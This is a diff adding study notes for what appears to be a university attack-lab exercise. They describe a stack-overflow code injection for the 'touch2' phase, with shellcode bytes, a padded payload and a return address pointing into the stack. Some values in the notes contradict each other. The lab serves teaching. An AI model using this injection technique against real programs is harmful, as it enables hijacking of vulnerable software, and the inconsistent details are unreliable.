@@ -1,0 +1,49 @@
+trick for touch2 is to set rdi to become a specific value
+to trigger the condition
+
+the value to set rdi to is 0x5561dca0
+
+the payload will change the return address to point to the top of the stack, 
+where it will execute the code injected sequentially.
+
+---------------------------
+|top of stack| return address 
+---------------------------
+|INJECTED CODE | bottom of stack
+--------------------------
+|INJECTED CODE | top of stack
+---------------------------
+
+The code to be injected will be to set rdi to the cookie value
+
+48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+68 ec 17 40 00       	pushq  $0x4017ec
+c3                   	retq
+
+payload: 
+
+48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 + filler + address in little endian 
+
+and the address of the top of the stack after calling is 0x5561dc78. 
+
+48 c7 c7 fa 97 b9 59 b8
+ec 17 40 00 ff e0 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+
+---------------------------
+|00 00 00 00 55 61 dc 78  | 0x5561dca0, return address after calling Gets()
+---------------------------
+|00 00 00 00 00 00 00 00  | bottom of stack
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 00 00 00 00 00  |
+---------------------------
+|00 00 00 c3 00 40 17 ec  |
+---------------------------
+|68 59 b9 97 fa c7 c7 48  | 0x5561dc78 - top of stack
+---------------------------
+
